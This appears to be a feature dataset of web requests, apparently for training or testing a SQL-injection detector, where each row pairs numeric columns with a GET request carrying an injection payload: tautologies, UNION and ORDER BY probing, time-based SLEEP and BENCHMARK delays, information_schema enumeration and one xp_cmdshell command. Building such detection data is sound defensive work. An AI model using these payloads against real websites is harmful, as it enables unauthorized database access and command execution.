72,2,200,6761,24,13,12,1,1,GET ?email= AND 7300=7300 AND 'pKlZ'='pKlZ&pass= ORDER BY 25--  HTTP/1.1
44,1,200,5880,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4452,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
44,1,200,4324,7,14,8,2,1,GET login/?id=admin") or ("1"="1"-- HTTP/1.1
163,1,200,6961,46,7,15,2,1,GET login/?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
137,1,200,7929,31,4,12,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28# HTTP/1.1
95,2,200,5270,30,12,18,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12#&pass=' ' HTTP/1.1
100,1,200,6438,21,8,5,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
128,2,200,1618,45,7,17,1,1,GET ?tel= UNION ALL SELECT 1_2_3_4_5_6-- &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
42,1,200,5446,7,16,9,1,1,GET ?account=")) or pg_sleep(5)-- HTTP/1.1
308,2,200,2878,149,7,60,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))&tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116)))# HTTP/1.1
32,1,200,2844,7,6,6,1,1,GET ?mail=") or ("1"="1 HTTP/1.1
49,1,200,5468,21,2,4,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7# HTTP/1.1
32,1,200,6634,14,4,3,1,1,GET ?code= ORDER BY 15  HTTP/1.1
122,1,200,2376,46,8,16,1,1,GET ?password= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16# HTTP/1.1
106,1,200,2312,41,14,14,1,1,GET ?account= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
106,1,200,7822,41,14,14,1,1,GET ?account= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
91,2,200,5212,30,13,19,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7#&pass=admin") or ("1"="1 HTTP/1.1
130,1,200,2834,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
130,1,200,2590,46,8,15,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
30,1,200,2235,14,2,4,1,1,GET ?id= ORDER BY 1#  HTTP/1.1
30,1,200,3785,14,2,4,1,1,GET ?id= ORDER BY 1#  HTTP/1.1
190,1,200,1804,96,14,25,1,1,GET ?code= AND (SELECT 4523 FROM(SELECT COUNT(*)_CONCAT(0x716a7a6a71_(SELECT (ELT(4523=4523_1)))_0x71706a6b71_FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) HTTP/1.1
94,2,200,2548,34,12,14,1,1,GET ?name=AND false&tel= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9# HTTP/1.1
31,1,200,1800,7,6,9,1,1,GET ?mail=%' or '0'='0 HTTP/1.1
31,1,200,4473,7,6,9,1,1,GET ?mail=%' or '0'='0 HTTP/1.1
35,1,200,4981,14,5,5,1,1,GET ?email= ORDER BY 29--  HTTP/1.1
35,1,200,5457,14,5,5,1,1,GET ?email= ORDER BY 29--  HTTP/1.1
35,1,200,6958,14,5,5,1,1,GET ?email= ORDER BY 29--  HTTP/1.1
39,2,200,1688,7,12,8,1,1,GET ?id=" or ""^"&id=or true-- HTTP/1.1
33,1,200,5375,12,7,7,1,1,GET ?phone=or SLEEP(5)-- HTTP/1.1
32,1,200,6322,7,9,4,2,1,GET login/?id=" or 1=1– HTTP/1.1
38,1,200,3307,7,12,5,1,1,GET ?email=admin" or "1"="1"# HTTP/1.1
38,1,200,4686,7,12,5,1,1,GET ?email=admin" or "1"="1"# HTTP/1.1
149,2,200,2505,66,11,32,1,1,GET ?email=' or ''-'&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
51,2,200,2302,14,9,14,1,1,GET ?phone=') or '1'='1'--&id= ORDER BY 1  HTTP/1.1
88,2,200,7307,7,53,13,1,1,GET ?email=")) or pg_sleep(5)--&phone=select system_user from sysibm.sysdummy1; HTTP/1.1
69,1,200,6990,30,8,14,1,1,GET ?username= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5# HTTP/1.1
147,2,200,4863,71,7,20,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10#&tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL--  HTTP/1.1
71,1,200,1832,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
71,1,200,6582,31,4,11,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5 HTTP/1.1
32,1,200,3532,12,7,6,1,1,GET ?phone=or SLEEP(5)# HTTP/1.1
32,1,200,4013,12,7,6,1,1,GET ?phone=or SLEEP(5)# HTTP/1.1
32,1,200,3766,12,7,6,1,1,GET ?phone=or SLEEP(5)# HTTP/1.1
32,1,200,3318,12,7,6,1,1,GET ?phone=or SLEEP(5)# HTTP/1.1
198,2,200,5435,88,10,39,1,1,GET ?id= AND 7300=7300 AND 'pKlZ'='pKlY&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75)))--  HTTP/1.1
124,2,200,3088,26,9,10,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24-- &pass=  SLEEP(10)   ' HTTP/1.1
159,2,200,1196,46,6,19,1,1,GET ?id=or 1=1&id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
47,2,200,7701,16,8,9,1,1,GET ?id= ORDER BY 27# &pass= OR x=y--  HTTP/1.1
30,1,200,1304,9,11,5,1,1,GET ?code=Time-Based: HTTP/1.1
30,1,200,3092,9,11,5,1,1,GET ?code=Time-Based: HTTP/1.1
92,1,200,7253,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12--  HTTP/1.1
215,2,200,6035,69,7,28,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11#&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27 HTTP/1.1
62,2,200,5041,17,16,10,1,1,GET ?name= benchmark(3200_SHA1(1)) '&tel= ORDER BY 7  HTTP/1.1
100,1,200,7168,30,4,14,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18# HTTP/1.1
127,2,200,5105,32,37,22,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7&pass= and (select substring(@@version_1_1))='M' HTTP/1.1
33,1,200,2605,14,4,4,1,1,GET ?code= ORDER BY 13#  HTTP/1.1
33,1,200,3074,14,4,4,1,1,GET ?code= ORDER BY 13#  HTTP/1.1
55,1,200,2081,30,4,9,1,1,GET ?user= UNION ALL SELECT USER()_SLEEP(5)--  HTTP/1.1
37,2,200,1634,7,10,7,1,1,GET ?code="^"&code=" or ""*" HTTP/1.1
26,1,200,4148,7,7,6,1,1,GET ?email='="or' HTTP/1.1
26,1,200,7772,7,7,6,1,1,GET ?email='="or' HTTP/1.1
93,1,200,2269,49,4,17,1,1,GET ?pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))--  HTTP/1.1
32,1,200,4849,10,12,3,2,1,GET login/?id=AND false HTTP/1.1
64,2,200,3831,21,12,9,1,1,GET ?id=' or true--&pass= UNION ALL SELECT 1_2_3_4_5_6# HTTP/1.1
65,1,200,4619,21,5,4,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12# HTTP/1.1
223,1,200,5364,102,8,43,1,1,GET ?password= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112) CHAR(106)))# HTTP/1.1
28,1,200,2493,7,6,4,1,1,GET ?user=" or ""-" HTTP/1.1
28,1,200,7080,7,6,4,1,1,GET ?user=" or ""-" HTTP/1.1
43,1,200,7964,7,14,7,2,1,GET ?account=admin") or ("1"="1"/* HTTP/1.1
43,1,200,4123,7,14,7,2,1,GET ?account=admin") or ("1"="1"/* HTTP/1.1
51,2,200,2809,14,10,8,1,1,GET ?mail=") or "1"="1&pass= ORDER BY 19#  HTTP/1.1
117,1,200,3446,21,4,3,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
117,1,200,1919,21,4,3,1,1,GET ?code= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30 HTTP/1.1
108,2,200,7333,24,55,10,1,1,GET ?tel=' UNION select table_schema_table_name FROM information_Schema.tables;#&name= ORDER BY 4#  HTTP/1.1
168,2,200,7088,21,38,14,2,1,GET ?email=admin' and substring(password/text()_1_1)='7&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
33,1,200,7498,14,4,4,1,1,GET ?code= ORDER BY 16#  HTTP/1.1
37,1,200,4353,14,8,4,1,1,GET ?password= ORDER BY 20#  HTTP/1.1
37,1,200,5485,14,8,4,1,1,GET ?password= ORDER BY 20#  HTTP/1.1
39,1,200,1772,7,14,8,1,1,GET ?email=1) or pg_sleep(5)-- HTTP/1.1
60,2,200,5059,26,10,10,1,1,GET ?email=ORDER BY SLEEP(5)#&phone= ORDER BY 16--  HTTP/1.1
81,2,200,2990,36,8,20,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2-- &pass= HAVING 1=0--  HTTP/1.1
211,1,200,2450,141,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
211,1,200,6037,141,7,17,1,1,GET ?account= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
113,2,200,1650,46,14,26,1,1,GET ?email=') or ('x')=('x&phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6 HTTP/1.1
113,1,200,7595,31,4,12,1,1,GET ?user= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20# HTTP/1.1
283,2,200,4374,137,12,53,1,1,GET ?username= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75))) HTTP/1.1
115,2,200,5394,28,12,8,1,1,GET ?username= ORDER BY 5-- &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
72,2,200,2528,7,32,15,1,1,GET ?mail=_(select * from (select(sleep(10)))a)&pass=" or 0=0 – HTTP/1.1
238,2,200,2857,96,4,31,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28-- &id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
82,2,200,1309,31,10,14,1,1,GET ?mail=" or ""-"&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A')) HTTP/1.1
112,1,200,6250,21,7,4,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27# HTTP/1.1
150,2,200,7420,44,10,19,1,1,GET ?id=1 AND (SELECT * FROM Users) = 1	&pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
200,2,200,7656,54,7,23,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21 HTTP/1.1
172,2,200,1170,93,15,28,1,1,GET ?account=') or ('x')=('x&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
124,1,200,2871,46,5,15,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18 HTTP/1.1
126,2,200,2158,31,11,16,1,1,GET ?email=" or 1=1#&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
56,1,200,2487,30,5,8,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_"'3 HTTP/1.1
56,1,200,1225,30,5,8,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_"'3 HTTP/1.1
56,1,200,3306,30,5,8,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_"'3 HTTP/1.1
27,1,200,3252,7,6,6,1,1,GET ?mail='or'1=1′ HTTP/1.1
116,2,200,4246,31,10,12,1,1,GET ?id= AND 7300=7300 AND 'pKlZ'='pKlY&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17--  HTTP/1.1
324,2,200,7803,137,7,57,1,1,GET ?tel= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))-- &name= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
119,1,200,2504,31,2,13,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22--  HTTP/1.1
212,1,200,7137,141,8,17,1,1,GET ?username= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
134,1,200,7453,66,5,25,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
134,1,200,2267,66,5,25,1,1,GET ?phone= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))# HTTP/1.1
208,2,200,7675,70,8,26,1,1,GET ?code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23#&code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10 HTTP/1.1
220,2,200,4240,96,29,35,1,1,GET ?phone=);waitfor delay '0:0:5'--&id= AND (SELECT 4523 FROM(SELECT COUNT(*)_CONCAT(0x716a7a6a71_(SELECT (ELT(4523=4523_1)))_0x71706a6b71_FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) HTTP/1.1
59,2,200,6128,7,25,12,1,1,GET ?name=1 or pg_sleep(5)--&phone=admin" or 1=1-- HTTP/1.1
225,2,200,3228,98,6,51,1,1,GET ?id=') or '1'='1--&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))# HTTP/1.1
54,2,200,2013,21,10,6,1,1,GET ?email= ORDER BY 10# &phone= ORDER BY 15  HTTP/1.1
69,2,200,2274,7,30,11,1,1,GET ?phone=' group by userid having 1=1--&id="or 1=1 or ""=" HTTP/1.1
45,1,200,1538,21,2,4,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5# HTTP/1.1
72,2,200,2329,9,20,19,2,1,GET ?phone=") or benchmark(10000000_MD5(1))#&id=') or '1'='1'/* HTTP/1.1
142,1,200,7922,46,4,16,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
142,1,200,5237,46,4,16,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
142,1,200,4823,46,4,16,1,1,GET ?pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24# HTTP/1.1
159,2,200,5674,70,4,25,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10 HTTP/1.1
32,1,200,1015,14,4,4,1,1,GET ?pass= ORDER BY 5#  HTTP/1.1
77,2,200,1037,7,44,12,1,1,GET ?email=exec master..xp_cmdshell 'net view'&phone=admin" or 1=1-- HTTP/1.1
123,2,200,4181,21,14,15,1,1,GET ?username= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23-- &pass=') or '1'='1'# HTTP/1.1
156,2,200,5924,31,13,18,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27-- &phone=") or ("a"="a HTTP/1.1
225,2,200,3055,85,6,31,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88) CHAR(88)))--  HTTP/1.1
37,1,200,7330,14,7,5,2,1,GET login/?id= ORDER BY 3--  HTTP/1.1
61,2,200,6604,7,19,17,1,1,GET ?email=' or '1'='1'--&phone=admin") or ("1"="1"# HTTP/1.1
140,1,200,7656,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
140,1,200,3810,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
140,1,200,2696,46,8,16,1,1,GET ?username= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
167,2,200,2501,77,10,31,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120)))-- &phone= ORDER BY 15#  HTTP/1.1
235,2,200,2876,116,12,31,1,1,GET ?username= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16--  HTTP/1.1
29,1,200,1573,7,6,6,1,1,GET ?user= or 0=0 -- HTTP/1.1
29,1,200,7776,7,6,6,1,1,GET ?user= or 0=0 -- HTTP/1.1
110,1,200,2467,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
110,1,200,5665,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
110,1,200,3934,31,4,12,1,1,GET ?pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
94,1,200,2701,21,5,5,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
94,1,200,1708,21,5,5,1,1,GET ?phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21--  HTTP/1.1
43,1,200,6489,7,16,7,1,1,GET ?mail=waitfor delay '00:00:05' HTTP/1.1
43,1,200,6475,7,16,7,1,1,GET ?mail=waitfor delay '00:00:05' HTTP/1.1
27,1,200,7145,7,6,6,1,1,GET ?code=or 1=1-- HTTP/1.1
27,1,200,7385,7,6,6,1,1,GET ?code=or 1=1-- HTTP/1.1
27,1,200,5854,7,6,6,1,1,GET ?code=or 1=1-- HTTP/1.1
165,2,200,1711,42,9,18,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&pass= ORDER BY 1_SLEEP(5)_3# HTTP/1.1
86,1,200,7333,31,8,11,1,1,GET ?password= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10 HTTP/1.1
41,1,200,3737,21,4,5,1,1,GET ?mail= UNION ALL SELECT 1--  HTTP/1.1
41,1,200,2151,21,4,5,1,1,GET ?mail= UNION ALL SELECT 1--  HTTP/1.1
61,1,200,2796,21,19,10,1,1,GET ?email=' UNION ALL SELECT system_user()_user();# HTTP/1.1
67,2,200,6691,11,18,14,1,1,GET ?phone= OR 1=0-- &id=1) or benchmark(10000000_MD5(1))# HTTP/1.1
289,2,200,5283,137,4,57,1,1,GET ?id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8#&id= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113) CHAR(112)))--  HTTP/1.1
60,2,200,5443,26,11,8,1,1,GET ?account= ORDER BY SLEEP(5)#&pass= ORDER BY 19  HTTP/1.1
55,1,200,2453,9,19,8,1,1,GET ?password=" or benchmark(10000000_MD5(1))# HTTP/1.1
55,1,200,6626,9,19,8,1,1,GET ?password=" or benchmark(10000000_MD5(1))# HTTP/1.1
50,2,200,7155,7,18,7,1,1,GET ?username=" or 1=1 –&pass=" or "x"="x HTTP/1.1
112,1,200,2536,21,2,5,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
32,1,200,4740,14,4,3,1,1,GET ?pass= ORDER BY 30  HTTP/1.1
89,1,200,6043,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
89,1,200,1306,31,5,13,1,1,GET ?email= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11--  HTTP/1.1
39,1,200,6902,7,12,11,1,1,GET ?phone=admin' or '1'='1'-- HTTP/1.1
